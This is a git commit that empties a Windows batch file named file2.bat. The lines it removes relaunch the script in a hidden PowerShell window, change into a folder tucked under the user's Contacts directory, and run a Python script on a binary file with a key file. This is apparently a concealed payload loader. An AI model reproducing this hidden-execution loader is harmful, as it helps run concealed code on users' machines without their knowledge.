afe62f009f1d4244895fadc8c6d30446c3317af0
MoViper2244 <ilovan738@gmail.com>
2025-09-08 18:11:14 -0700

    Update file2.bat

--- file2.bat
+++ file2.bat
@@ -1,15 +1,1 @@
-@echo off
-if not "%~1"=="h" (
-    powershell -windowstyle hidden -command "Start-Process '%~f0' -ArgumentList 'h' -WindowStyle Hidden"
-    exit /b
-)
 
-set "d=%USERPROFILE%\Contacts\zo"
-
-:: Rulează scriptul Python hidden
-cd /d "%d%"
-if exist "sh.py" if exist "voo.bin" if exist "x.txt" (
-    python.exe sh.py -i voo.bin -k x.txt
-)
-
-exit /b 0
